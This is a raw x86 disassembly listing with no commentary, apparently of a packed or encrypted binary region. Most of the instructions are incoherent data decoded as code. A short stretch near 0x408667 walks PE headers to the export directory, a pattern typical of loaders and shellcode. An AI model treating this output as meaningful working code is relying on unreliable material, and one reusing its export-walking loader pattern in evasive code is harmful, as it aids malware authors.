  40837f:	xor    eax,0xee44fd1d
  408384:	mov    esp,0x84431d7b
  408389:	loope  0x4083e6
  40838b:	loope  0x408353
  40838d:	adc    al,0xcd
  40838f:	jg     0x40838b
  408391:	xchg   eax,esp
  408393:	or     bl,BYTE PTR cs:[edi+ecx*2-0x2047b393]
  40839b:	push   edx
  40839c:	and    dl,cl
  40839e:	repz lock out 0xb5,al
  4083a2:	retf   0xb355
  4083a5:	neg    DWORD PTR [ebp+ecx*2+0x76]
  4083a9:	adc    ah,bh
  4083ab:	jns    0x4083f1
  4083ad:	ins    BYTE PTR es:[edi],dx
  4083ae:	jno    0x408395
  4083b0:	rol    DWORD PTR [ecx-0x659f5ae],0x12
  4083b7:	dec    ebx
  4083b8:	mov    ds:0x58c6b98d,al
  4083bd:	rcr    DWORD PTR [edx-0x677ffe3c],1
  4083c3:	mov    ch,bh
  4083c5:	xchg   dh,cl
  4083c7:	push   esi
  4083c8:	retf   0x84a5
  4083cb:	inc    esi
  4083cc:	adc    BYTE PTR [ebx-0x5f534e65],bl
  4083d2:	push   edi
  4083d3:	push   esi
  4083d4:	or     al,0x2
  4083d6:	in     eax,0xd9
  4083d8:	push   esi
  4083d9:	mov    ecx,0xba55551f
  4083de:	std    
  4083df:	sti    
  4083e0:	repz mov ds:0x9ad23654,al
  4083e6:	and    BYTE PTR [eax],dh
  4083e8:	sar    bl,1
  4083ea:	cld    
  4083eb:	add    edx,DWORD PTR [ebx-0x5b]
  4083ee:	arpl   WORD PTR [edi],di
  4083f0:	sar    DWORD PTR [edx+0x237dd6bc],0x70
  4083f7:	lods   eax,DWORD PTR ds:[esi]
  4083f8:	nop
  4083f9:	push   ebp
  4083fa:	sbb    DWORD PTR [ecx-0x67f7c568],edx
  408400:	adc    DWORD PTR [edx+eax*2],ebx
  408403:	pop    ebx
  408404:	mov    esp,0x299c2d8c
  408409:	outs   dx,DWORD PTR ds:[esi]
  40840a:	pusha  
  40840b:	sbb    BYTE PTR [ebx+0x6a],0x90
  40840f:	jne    0x408398
  408411:	fistp  QWORD PTR [eax+0x2c]
  408414:	scas   eax,DWORD PTR es:[edi]
  408415:	imul   edi,DWORD PTR [edi],0x7a8f109f
  40841b:	rcr    BYTE PTR [edx+0x4991afd7],1
  408421:	imul   eax,DWORD PTR [esi+0x13],0x36
  408425:	push   ss
  408426:	sub    al,0x3e
  408428:	push   ecx
  408429:	push   ecx
  40842a:	jg     0x408417
  40842c:	and    bl,ch
  40842e:	push   edx
  40842f:	repz addr16 inc ecx
  408432:	inc    edx
  408433:	push   eax
  408434:	adc    edx,edx
  408436:	(bad)  
  408437:	outs   dx,BYTE PTR ds:[esi]
  408438:	and    DWORD PTR [esi],ebp
  40843a:	jns    0x4083c9
  40843c:	loop   0x40840a
  40843e:	xchg   ebp,eax
  40843f:	enter  0xb11,0xa4
  408443:	sub    BYTE PTR [esi],ah
  408445:	sbb    DWORD PTR [edx+0x70],ebx
  408448:	pop    es
  408449:	add    ebx,DWORD PTR [edx-0x5c]
  40844c:	cmp    ebx,DWORD PTR [edi]
  40844e:	add    al,0x1c
  408450:	dec    ebp
  408451:	dec    edi
  408452:	or     BYTE PTR [ecx],cl
  408454:	add    DWORD PTR [eax-0x1221783c],ecx
  40845a:	pusha  
  40845b:	in     al,dx
  40845c:	adc    BYTE PTR ds:0x5c827dda,dl
  408462:	pusha  
  408463:	daa    
  408464:	bound  eax,QWORD PTR [ebx+0x6fc3b49f]
  40846a:	lahf   
  40846b:	jno    0x4083fa
  40846d:	fisttp QWORD PTR [ebx-0x2dc5ce86]
  408473:	pop    ecx
  408474:	sub    dh,BYTE PTR [edi]
  408476:	(bad)  
  408477:	mov    cl,0xfe
  408479:	add    DWORD PTR [eax],0xffffffe6
  40847c:	mov    bl,0xda
  40847e:	sub    al,0xf7
  408480:	loopne 0x408422
  408482:	sbb    al,0x93
  408484:	add    BYTE PTR [ecx+0x74],ah
  408487:	inc    ebx
  408488:	jmp    0x44aa506f
  40848d:	mov    al,0xe5
  40848f:	fst    DWORD PTR [ebx+0x5a4711f7]
  408495:	(bad)  
  408496:	mov    al,ds:0x3edb8836
  40849b:	and    DWORD PTR ds:0x8cdd012f,ebp
  4084a1:	xchg   esp,eax
  4084a2:	gs push cs
  4084a4:	and    al,0xa6
  4084a6:	jmp    0xea38:0x3ce6d294
  4084ad:	jbe    0x40845d
  4084af:	aam    0xba
  4084b1:	fimul  WORD PTR ds:0x9b6374a9
  4084b7:	push   edx
  4084b8:	mov    WORD PTR [edx+0x7],ss
  4084bb:	adc    DWORD PTR ds:0x4de602ad,esp
  4084c1:	fwait
  4084c2:	mov    BYTE PTR [esi-0x3d],dl
  4084c5:	cdq    
  4084c6:	push   edx
  4084c7:	add    dh,BYTE PTR [ebx-0x59]
  4084ca:	aas    
  4084cb:	aas    
  4084cc:	sub    al,BYTE PTR [edx]
  4084ce:	lahf   
  4084cf:	lods   al,BYTE PTR ds:[esi]
  4084d0:	inc    eax
  4084d1:	lods   eax,DWORD PTR ds:[esi]
  4084d2:	ficom  WORD PTR [esi-0x2fac8612]
  4084d8:	fnstenv [esi-0x41]
  4084db:	out    dx,al
  4084dc:	(bad)  
  4084dd:	dec    edx
  4084de:	out    0x79,al
  4084e0:	sbb    bh,ch
  4084e2:	in     al,dx
  4084e3:	in     al,dx
  4084e4:	hlt    
  4084e5:	inc    esi
  4084e6:	test   eax,0x9dc250e3
  4084eb:	(bad)  
  4084ed:	mov    al,0x48
  4084ef:	popf   
  4084f0:	call   0x50730b79
  4084f5:	dec    edi
  4084f6:	xchg   esp,eax
  4084f7:	stos   BYTE PTR es:[edi],al
  4084f8:	sbb    bh,BYTE PTR [esi+0x15dce2e6]
  4084fe:	sbb    ebp,DWORD PTR [eax-0x16ffb5f2]
  408504:	ret    0x7bb
  408507:	lahf   
  408508:	push   es
  408509:	mov    WORD PTR [ebp+0x83801f6],?
  40850f:	dec    edx
  408510:	xor    eax,DWORD PTR [edi-0x3c]
  408513:	push   ss
  408514:	sub    eax,0xb03e16b1
  408519:	stc    
  40851a:	cmp    ax,bp
  40851d:	jle    0x4084c0
  40851f:	mov    al,0xa
  408521:	and    cl,BYTE PTR [ecx+ebp*1-0x45]
  408525:	fs push cs
  408527:	out    0x33,al
  408529:	adc    eax,0x6db51f2c
  40852e:	(bad)  
  40852f:	mov    esp,0xc2b09d91
  408534:	mov    al,0x19
  408536:	mov    WORD PTR [edi],ds
  408538:	out    0xc6,eax
  40853a:	mov    bh,0x4e
  40853c:	inc    ebx
  40853d:	xor    al,0xcc
  40853f:	inc    esp
  408540:	into   
  408541:	popf   
  408542:	sti    
  408543:	push   ds
  408544:	push   esp
  408545:	inc    esi
  408546:	int    0xd3
  408548:	push   ebx
  408549:	cmp    edx,DWORD PTR [eax+0x6f]
  40854c:	loop   0x408501
  40854e:	mov    bh,0x1a
  408550:	push   edx
  408551:	push   ecx
  408552:	call   0x929cb76f
  408557:	ficom  DWORD PTR [edx-0x668ddbe1]
  40855d:	aas    
  40855e:	xor    al,0xaa
  408560:	pop    esp
  408561:	jge    0x40853d
  408563:	jb     0x40859d
  408565:	lea    ecx,[ebx+ecx*2+0x393a10f2]
  40856c:	lods   al,BYTE PTR ds:[esi]
  40856d:	sbb    DWORD PTR [ebx],ebx
  40856f:	rol    DWORD PTR [esi+0xf2f0188],0xcb
  408576:	push   eax
  408577:	mov    bh,0xd
  408579:	stc    
  40857a:	push   ebp
  40857b:	fstp   DWORD PTR [ecx+0x73]
  40857e:	aas    
  40857f:	sbb    al,BYTE PTR ds:0x2568de62
  408585:	shl    bl,0xbe
  408588:	xor    eax,0x9702d501
  40858d:	popa   
  40858e:	pop    esi
  40858f:	cmp    esi,esp
  408591:	in     al,dx
  408592:	mov    edi,0x91aee133
  408597:	enter  0xe842,0x6e
  40859b:	inc    eax
  40859c:	pop    ss
  40859d:	sbb    eax,0xf9dc6092
  4085a2:	inc    ecx
  4085a3:	mov    ebx,0xd203ba85
  4085a8:	xor    BYTE PTR [esi+0x1a538f80],bl
  4085ae:	mov    cl,0x9d
  4085b0:	(bad)  
  4085b1:	fidiv  WORD PTR [eax-0x65]
  4085b4:	call   0x9d1c7675
  4085b9:	hlt    
  4085ba:	pop    ss
  4085bb:	xchg   edi,eax
  4085bc:	xchg   ebx,eax
  4085bd:	ja     0x40862b
  4085bf:	adc    bl,cl
  4085c1:	lods   eax,DWORD PTR ds:[esi]
  4085c2:	add    dh,cl
  4085c4:	cli    
  4085c5:	adc    bh,BYTE PTR [esi+edx*4]
  4085c8:	(bad)  
  4085c9:	out    0x16,al
  4085cb:	popf   
  4085cc:	(bad)  
  4085cd:	pop    ds
  4085ce:	lods   al,BYTE PTR ds:[esi]
  4085cf:	pusha  
  4085d0:	jne    0x40862c
  4085d2:	repz xchg edi,eax
  4085d4:	or     BYTE PTR [ebp+0x39],ch
  4085d7:	and    edx,DWORD PTR [ebx]
  4085d9:	xchg   cl,dl
  4085db:	sub    eax,DWORD PTR [edx+0x33]
  4085de:	in     eax,0x7d
  4085e0:	jne    0x4085fc
  4085e2:	push   ecx
  4085e3:	inc    esi
  4085e4:	ins    DWORD PTR es:[edi],dx
  4085e5:	sbb    edx,edx
  4085e7:	fldenv [eax+0x0]
  4085ea:	xlat   BYTE PTR ds:[ebx]
  4085eb:	(bad)
  4085ee:	fimul  DWORD PTR [ecx]
  4085f0:	mov    eax,ds:0x6703a568
  4085f5:	into   
  4085f6:	mov    cs,WORD PTR [esi]
  4085f8:	and    al,BYTE PTR [ebx-0x6ff4ef4a]
  4085fe:	outs   dx,BYTE PTR ds:[esi]
  4085ff:	pop    es
  408600:	in     al,dx
  408601:	lea    ebx,[ebx+0x0]
  408604:	sub    esp,eax
  408606:	or     BYTE PTR [edi+edi*8+0x3c],bl
  40860a:	in     al,0x97
  40860c:	fidiv  DWORD PTR [esi-0x2b729976]
  408612:	cmp    eax,0x55bbab81
  408617:	sub    eax,ebx
  408619:	cmp    esp,esi
  40861b:	pop    eax
  40861c:	loopne 0x408660
  40861e:	or     eax,0xf1bb6fb4
  408623:	jno    0x40866a
  408625:	lods   eax,DWORD PTR ds:[esi]
  408626:	call   0x4f62:0x87eeb87b
  40862d:	outs   dx,BYTE PTR ds:[esi]
  40862e:	mov    cl,0x60
  408630:	push   ds
  408631:	sbb    dh,al
  408633:	aaa    
  408634:	repz adc edi,DWORD PTR [ecx+0x42]
  408638:	add    al,BYTE PTR [edi+0x78bcde27]
  40863e:	mov    al,ds:0x1b121170
  408643:	push   edi
  408644:	jae    0x40868b
  408646:	push   0xffffff97
  408648:	iret   
  408649:	add    BYTE PTR [edi],cl
  40864b:	ficom  WORD PTR [eax*4+0x28bddf81]
  408652:	clc    
  408653:	jmp    0xcc5959c
  408658:	add    BYTE PTR [eax],al
  40865a:	add    BYTE PTR [ebx+0x45399c45],cl
  408660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xb07d51c9
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [eax],al
  40869e:	cld    
  40869f:	fwait
  4086a0:	das    
  4086a1:	out    dx,eax
  4086a2:	sbb    eax,0x1ed53cb5
  4086a7:	push   ds
  4086a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086a9:	(bad)  [esi-0x7ecf565b]
  4086af:	daa    
  4086b0:	dec    ebp
  4086b1:	mov    al,BYTE PTR [ebp-0x46]
  4086b4:	in     al,dx
  4086b5:	xchg   ebx,eax
  4086b6:	mov    bl,0xde
  4086b8:	jo     0x408640
  4086ba:	(bad)  
  4086bb:	outs   dx,DWORD PTR ds:[esi]
  4086bc:	shr    DWORD PTR [eax],cl
  4086be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086bf:	mov    al,0x54
  4086c1:	jg     0x4086db
  4086c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086c4:	mov    ebx,cs
  4086c6:	sahf   
  4086c7:	adc    eax,0x1f345080
  4086cc:	jb     0x408693
  4086ce:	and    dh,BYTE PTR [eax-0x33f39a7]
  4086d4:	and    dl,bl
  4086d6:	loopne 0x4086f8
  4086d8:	xlat   BYTE PTR ds:[ebx]
  4086d9:	das    
  4086da:	mov    ebp,0x6d704692
  4086df:	or     eax,edx
  4086e1:	add    bl,ah
  4086e3:	(bad)  
  4086e4:	mov    bl,0x2a
  4086e6:	cmp    edx,DWORD PTR [ecx+0x6a]
  4086e9:	aam    0x42
  4086eb:	sub    bl,BYTE PTR [edi]
  4086ed:	shr    BYTE PTR [edx+0x436506ec],0xc1
  4086f4:	add    ebp,DWORD PTR [esi]
  4086f6:	cs cld 
  4086f8:	lds    ebx,FWORD PTR [edi+0x34f77e05]
  4086fe:	pop    ecx
  4086ff:	mov    ecx,0x3c82d23b
  408704:	add    edi,esp
  408706:	push   0x1
  408708:	jecxz  0x408736
  40870a:	and    esp,DWORD PTR [ebx]
  40870c:	pop    ss
  40870d:	inc    ebp
  40870e:	dec    ecx
  40870f:	ficomp WORD PTR [edi+0x23c75b17]
  408715:	inc    esi
  408716:	add    al,0xa0
  408718:	rol    BYTE PTR [ebx-0xc9089b6],0xc4
  40871f:	adc    eax,0xc1a3e1cc
  408724:	push   ss
  408725:	jge    0x4086d6
  408727:	sti    
  408728:	jnp    0x4086ea
  40872a:	repz inc esi
  40872c:	pop    edx
  40872d:	adc    DWORD PTR ds:0x6b0ee132,esp
  408733:	shr    DWORD PTR [ecx-0x7d],1
  408736:	in     al,dx
  408737:	mov    ebx,edx
  408739:	and    ch,BYTE PTR [eax]
  40873b:	xor    esi,DWORD PTR [ebp+ecx*1-0x3a800c39]
  408742:	(bad)  
  408743:	push   esp
  408744:	sub    ch,BYTE PTR [esi-0x6a]
  408747:	cli    
  408748:	fwait
  408749:	push   cs
  40874a:	ss push edi
  40874c:	dec    edi
  40874e:	arpl   WORD PTR [esi],sp
  408750:	pop    ds
  408751:	lods   eax,DWORD PTR ds:[esi]
  408752:	inc    ebp
  408753:	leave  
  408754:	push   cs
  408755:	fmul   st(0),st
  408757:	test   al,0xcc
  408759:	ss popa 
  40875b:	inc    eax
  40875c:	xchg   edi,eax
  40875d:	and    DWORD PTR [ebx+ebp*1-0x3cdff9ac],0xffffff99
  408765:	neg    esp
  408767:	jmp    0x521d:0xbd116ae0
  40876e:	imul   eax
  408770:	mov    edi,0x4fbd9095
  408775:	in     al,0xda
  408777:	mov    ecx,0x53cd74db
  40877c:	shl    DWORD PTR [esi+0x7e],1
  40877f:	hlt    
  408780:	jae    0x408717
  408782:	or     esi,edi
  408784:	rol    BYTE PTR [eax-0x27],cl
  408787:	ins    BYTE PTR es:[edi],dx
  408788:	jne    0x408729
  40878a:	jno    0x4087df
  40878c:	and    BYTE PTR [edi+0x68],0x73
  408790:	sub    eax,0x6e7aebcd
  408795:	into   
  408796:	or     al,0xb
  408798:	test   al,0x71
  40879a:	xor    al,0xbf
  40879c:	lods   eax,DWORD PTR ds:[esi]
  40879d:	(bad)  
  40879e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4087a0:	call   0x9bf3:0x89e07067
  4087a7:	cwde   
  4087a8:	lods   al,BYTE PTR ds:[esi]
  4087a9:	inc    esi
  4087aa:	repz loopne 0x4087b9
  4087ad:	data16 loope 0x40882f
  4087b0:	cs sub eax,0x4a0f728
  4087b6:	inc    eax
  4087b7:	ins    BYTE PTR es:[edi],dx
  4087b8:	push   ecx
  4087b9:	jmp    0xbdf5:0x98d60d63
  4087c0:	xchg   esp,eax
  4087c1:	or     DWORD PTR [edx+eax*1+0x2c47c20e],edx
  4087c8:	fimul  DWORD PTR [edi]
  4087ca:	test   BYTE PTR [eax-0x454c8d20],bl
  4087d0:	or     BYTE PTR [edi],dh
  4087d2:	cmp    esp,DWORD PTR [ecx-0x3d]
  4087d5:	test   eax,0xaf9ecbdd
  4087da:	pop    esi
  4087db:	sbb    al,0x1e
  4087dd:	push   ecx
  4087de:	scas   al,BYTE PTR es:[edi]
  4087df:	out    dx,eax
  4087e0:	cli    
  4087e1:	sbb    al,0xbf
  4087e3:	adc    eax,0xd3c8207
  4087e8:	add    DWORD PTR [edx],esi
  4087ea:	and    BYTE PTR [ebx],ah
  4087ec:	mov    ebx,0x861fe1dd
  4087f1:	push   0x84c39f18
  4087f6:	fiadd  DWORD PTR [edx+0x57]
  4087f9:	lahf   
  4087fa:	test   DWORD PTR [edx+0x16],ebp
  4087fd:	jle    0x4087e8
  4087ff:	adc    BYTE PTR [eax+0x37e12334],bl
  408805:	ins    DWORD PTR es:[edi],dx
  408806:	push   esi
  408807:	pop    ebp
  408808:	jp     0x408869
  40880a:	add    ebx,esp
  40880c:	div    ah
  40880e:	or     al,0x27
  408810:	das    
  408811:	not    BYTE PTR [ebp+0x64]
  408814:	aam    0xa8
  408816:	sbb    BYTE PTR [ecx+0x2a],bl
  408819:	sti    
  40881a:	push   cs
  40881b:	add    ah,dh
  40881d:	mov    dh,0x7c
  40881f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408820:	rol    DWORD PTR [eax-0x55],cl
  408823:	fwait
  408824:	mov    BYTE PTR [ebx-0x21],bh
  408827:	sub    eax,0x759f48c5
  40882c:	and    BYTE PTR [eax+eiz*4-0x75bbb14c],dl
  408833:	mov    esi,DWORD PTR [ebp-0x6aca991f]
  408839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40883a:	push   edi
  40883b:	clc    
  40883c:	icebp  
  40883d:	fwait
  40883e:	mov    al,0xb5
  408840:	jo     0x4088c0
  408842:	sbb    DWORD PTR [esi],esi
  408844:	xlat   BYTE PTR ds:[ebx]
  408845:	fsubr  DWORD PTR [eax+0x17]
  408848:	sub    DWORD PTR [ebx+0x4226523a],ecx
  40884e:	inc    ebp
  40884f:	sbb    al,0xad
  408851:	inc    ebx
  408852:	xlat   BYTE PTR ds:[ebx]
  408853:	out    0xa3,al
  408855:	xchg   ecx,eax
  408856:	adc    DWORD PTR [ebx-0x35365cdf],ebp
  40885c:	cdq    
  40885d:	push   ds
  40885e:	stc    
  40885f:	stos   BYTE PTR es:[edi],al
  408860:	cmc    
  408861:	mov    bh,0x4
  408863:	outs   dx,DWORD PTR ds:[esi]
  408864:	jg     0x40881a
  408866:	sub    edx,ecx
  408868:	stos   DWORD PTR es:[edi],eax
  408869:	icebp  
  40886a:	xchg   esi,eax
  40886b:	pop    ecx
  40886c:	jg     0x4088cb
  40886e:	lods   al,BYTE PTR fs:[esi]
  408870:	mov    ds:0xee605a20,eax
  408875:	pop    esi
  408876:	mov    edi,0x19c45245
  40887b:	or     ebx,DWORD PTR [eax]
  40887d:	push   edi
  40887e:	sbb    al,0x91
  408880:	pop    ebx
  408881:	fiadd  DWORD PTR [edx+0x6]
  408884:	(bad)
  408887:	mov    ebx,0x4ae897af
  40888c:	inc    edi
  40888d:	(bad)  
  40888e:	aaa    
  40888f:	ins    DWORD PTR es:[edi],dx
  408890:	xchg   DWORD PTR [edx-0x4a7c008e],esp
  408896:	into   
  408897:	mov    esp,DWORD PTR [edi]
  408899:	cmc    
  40889a:	ficom  WORD PTR [ebx+0x182b1368]
  4088a0:	push   ebp
  4088a1:	jo     0x4088b8
  4088a3:	jne    0x408884
  4088a5:	inc    DWORD PTR [ebx]
  4088a7:	fiadd  WORD PTR [ecx]
  4088a9:	add    esp,DWORD PTR [edi-0xd4b567a]
  4088af:	dec    eax
  4088b0:	pop    edi
  4088b1:	jo     0x4088a0
  4088b3:	mov    ah,0xe8
  4088b5:	out    dx,eax
  4088b6:	adc    BYTE PTR [edi-0x57f3d810],bl
  4088bc:	fisub  DWORD PTR [edi]
  4088be:	cld    
  4088bf:	shr    BYTE PTR ds:0x34632d31,cl
  4088c5:	adc    BYTE PTR [esi-0x65],ah
  4088c8:	arpl   cx,sp
  4088ca:	inc    ecx
  4088cb:	mov    ch,0xcf
  4088cd:	int3   
  4088ce:	xchg   edi,eax
  4088cf:	ins    BYTE PTR es:[edi],dx
  4088d0:	out    0xf3,al
  4088d2:	loop   0x4088d5
  4088d4:	lock popf 
  4088d6:	cdq    
  4088d7:	inc    eax
  4088d8:	sub    eax,0x1a250ac8
  4088dd:	rcl    BYTE PTR [esi],0xcd
  4088e0:	pusha  
  4088e1:	outs   dx,BYTE PTR ds:[esi]
  4088e2:	inc    ebx
  4088e3:	rcl    DWORD PTR [esi],0xed
  4088e6:	push   ebp
  4088e7:	lds    edi,FWORD PTR ds:0x44e9d379
  4088ed:	xor    eax,0x1f6a3183
  4088f2:	or     eax,0x36470369
  4088f7:	iret   
  4088f8:	mov    ch,BYTE PTR [esi-0xad80571]
  4088fe:	int    0xfd
  408900:	add    eax,0x5b096a22
  408905:	mov    esi,0x46bcd0d7
  40890a:	(bad)  
  40890b:	(bad)  
  40890c:	stc    
  40890d:	pop    ss
  40890e:	mov    ebx,0xac9d761f
  408913:	jp     0x408974
  408915:	mov    edx,gs
  408917:	push   0xfffffffe
  408919:	pusha  
  40891a:	push   esp
  40891b:	ret    0x935
  40891e:	test   DWORD PTR [edx],edi
  408920:	pop    es
  408921:	retf   
  408922:	in     al,dx
  408923:	jge    0x40890f
  408925:	xor    edi,DWORD PTR [edx+0x4fb2cc90]
  40892b:	mov    ch,0x8e
  40892d:	and    DWORD PTR [esi+ebp*1-0x79],ebp
  408931:	cmp    al,0x4d
  408933:	in     eax,0x42
  408935:	xor    DWORD PTR [ecx+edi*2-0x3e],ecx
  408939:	push   ebp
  40893a:	add    dl,BYTE PTR [ecx-0x7d73d841]
  408940:	fst    st(2)
  408942:	daa    
  408943:	jae    0x408912
  408945:	int3   
  408946:	cmp    ebx,ebp
  408948:	jbe    0x40895d
  40894a:	stos   DWORD PTR es:[edi],eax
  40894b:	cmc    
  40894c:	mov    esp,fs
  40894e:	retf   
  40894f:	imul   ebx,DWORD PTR [edi+0x35a3d2d3],0x2b93aea5
  408959:	cmp    ah,BYTE PTR [esi]
  40895b:	add    esp,eax
  40895d:	addr16 iret 
  40895f:	popa   
  408960:	sbb    DWORD PTR [ebp+0x4bd1085b],0x5ab4778d
  40896a:	mov    ah,0x31
  40896c:	push   es
  40896d:	call   0xb9e:0xd6a85da5
  408974:	(bad)  
  408975:	pusha  
  408976:	aas    
  408977:	pop    edi
  408978:	xor    al,0x3e
  40897a:	adc    bl,BYTE PTR [eax+0xe]
  40897d:	in     al,0xc8
  40897f:	shl    dh,cl
  408981:	mov    al,ds:0x3c71f60e
  408986:	add    BYTE PTR [ebp+0x7b],0x3
  40898a:	aad    0x95
  40898c:	and    DWORD PTR [ebp-0x3f],ebx
  40898f:	arpl   sp,si
  408991:	mov    cl,0x72
  408993:	jl     0x408978
  408995:	xchg   edi,eax
  408996:	inc    ebp
  408997:	inc    DWORD PTR [eax-0x27317f35]
  40899d:	adc    BYTE PTR [edx],ch
  40899f:	popa   
  4089a0:	and    DWORD PTR [ecx+0x5e66a02c],edx
  4089a6:	cmp    eax,0x30a33c1c
  4089ab:	mov    WORD PTR [ecx+0x1b],ss
  4089ae:	fidivr DWORD PTR [ecx+eiz*8-0x3bdc6055]
  4089b5:	sbb    DWORD PTR [ecx+0x27a04eb7],ebx
  4089bb:	fstp   DWORD PTR ds:[esi]
  4089be:	adc    eax,0xba630ee6
  4089c3:	mov    eax,ds:0x8f166e45
  4089c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c9:	fbld   TBYTE PTR [edi+ecx*8-0xe]
  4089cd:	mov    al,BYTE PTR [edx+0x51aa6082]
  4089d3:	pop    esp
  4089d4:	add    DWORD PTR [ecx-0x5e6a9fd6],edi
  4089da:	push   edx
  4089db:	rcr    BYTE PTR [ecx+0x199f2289],0xeb
  4089e2:	push   esi
  4089e3:	jmp    DWORD PTR [ebx]
  4089e5:	mov    esi,0x1a1a8443
  4089ea:	pop    eax
  4089eb:	sbb    dh,BYTE PTR [edi-0x5b]
  4089ee:	xor    al,0xb8
  4089f0:	cdq    
  4089f1:	jno    0x408a5d
  4089f3:	pusha  
  4089f4:	jecxz  0x4089a3
  4089f6:	sahf   
  4089f7:	ins    BYTE PTR es:[edi],dx
  4089f8:	js     0x408a4b
  4089fa:	out    0xfd,al
  4089fc:	push   edx
  4089fd:	rol    DWORD PTR [esi+0x7a3cc685],cl
  408a03:	imul   ecx,DWORD PTR [eax],0xffffffdd
  408a06:	dec    eax
  408a07:	(bad)  
  408a08:	jmp    0xb405:0x86cd15ea
  408a0f:	add    eax,0xdf27951c
  408a14:	xchg   ebx,eax
  408a15:	lods   eax,DWORD PTR ds:[esi]
  408a16:	fld    TBYTE PTR [ecx-0x59]
  408a19:	dec    ecx
  408a1a:	jns    0x4089f3
  408a1c:	ret    0x3926
  408a1f:	rcl    BYTE PTR [edi],cl
  408a21:	pop    edx
  408a22:	dec    ebp
  408a23:	or     edx,DWORD PTR [eax-0x23]
  408a26:	rol    BYTE PTR gs:[ecx],0x63
  408a2a:	scas   al,BYTE PTR es:[edi]
  408a2b:	or     eax,DWORD PTR [edi]
  408a2d:	xor    BYTE PTR [edi],bh
  408a2f:	aaa    
  408a30:	sar    DWORD PTR ds:0x77a23f8d,1
  408a36:	cmp    DWORD PTR [edx+eiz*4-0x18a7c7f9],esi
  408a3d:	shl    DWORD PTR [ebp-0x14013662],1
  408a43:	cs sahf 
  408a45:	mov    dl,0x50
  408a47:	bound  esi,QWORD PTR [ebx-0xb2faa1d]
  408a4d:	adc    al,0xb5
  408a4f:	inc    edi
  408a50:	sbb    BYTE PTR [esi+0x27a51a5e],ch
  408a56:	sub    DWORD PTR [eax],esi
  408a58:	adc    DWORD PTR [ebp*8-0x741fe320],esp
  408a5f:	push   es
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	fnstsw WORD PTR [ebx-0x7d]
  408a77:	jl     0x408a2e
  408a79:	push   edi
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    BYTE PTR [esi-0x2c],ch
  408a82:	ret    
  408a83:	fisub  WORD PTR [ecx+0x23]
  408a86:	cdq    
  408a87:	gs dec edx
  408a89:	pop    es
  408a8a:	dec    ecx
  408a8b:	inc    edx
  408a8c:	cmp    al,BYTE PTR [ebp+0x55a9b337]
  408a92:	mov    ds:0xa82d7dee,al
  408a97:	cmp    eax,DWORD PTR [ecx-0x5a5010cf]
  408a9d:	cmc    
  408a9e:	repnz es retf 
  408aa1:	aaa    
  408aa2:	mov    esi,0x439305bb
  408aa7:	sbb    al,0x3d
  408aa9:	xchg   esi,eax
  408aaa:	jne    0x408a74
  408aac:	add    al,0xa2
  408aae:	sbb    eax,0x399d0a33
  408ab3:	int    0xa5
  408ab5:	dec    ebp
  408ab6:	adc    al,0x5f
  408ab8:	rcr    DWORD PTR [esi-0x1e3af18e],0x6c
  408abf:	push   es
  408ac0:	in     eax,0x37
  408ac2:	add    BYTE PTR ds:0x39d5a20e,0xc1
  408ac9:	or     DWORD PTR [edi+0x31587a1c],eax
  408acf:	scas   eax,DWORD PTR es:[edi]
  408ad0:	and    eax,0x58ca151b
  408ad5:	or     al,0x24
  408ad7:	dec    ebx
  408ad8:	fldcw  WORD PTR [eax+esi*8+0x616ef4a1]
  408adf:	test   eax,0x3d076fd8
  408ae5:	pop    eax
  408ae6:	cmp    ebx,DWORD PTR [ebx-0x6d]
  408ae9:	fdiv   st,st(4)
  408aec:	imul   esi,DWORD PTR [edx],0xffffffc2
  408aef:	inc    ebp
  408af0:	sbb    BYTE PTR [esi+0x51caa7a3],cl
  408af6:	and    edx,DWORD PTR [edx+0xa]
  408af9:	sub    BYTE PTR [eax+0x4d],dl
  408afc:	adc    BYTE PTR [ecx],bl
  408afe:	mov    edx,0x240387c
  408b03:	(bad)  
  408b04:	mov    bl,0x44
  408b06:	inc    eax
  408b07:	fsub   DWORD PTR [ebp+0x3e]
  408b0a:	xchg   DWORD PTR [esi],edx
  408b0c:	(bad)  
  408b0e:	fldcw  WORD PTR [edx]
  408b10:	xchg   esp,eax
  408b11:	rcl    BYTE PTR [ecx],1
  408b13:	xor    ebp,DWORD PTR [ebx]
  408b15:	jnp    0x408abf
  408b17:	inc    edx
  408b18:	outs   dx,BYTE PTR ds:[esi]
  408b19:	push   es
  408b1a:	dec    ebx
  408b1b:	xor    cl,bh
  408b1d:	push   ss
  408b1e:	mov    ch,0x1c
  408b20:	xchg   esp,eax
  408b21:	ins    BYTE PTR es:[edi],dx
  408b22:	mov    dh,0xd2
  408b24:	dec    ecx
  408b25:	call   0x6ac0:0x8df96c4e
  408b2c:	mov    eax,ds:0x1deeaeb
  408b31:	mov    ecx,0x1a482017
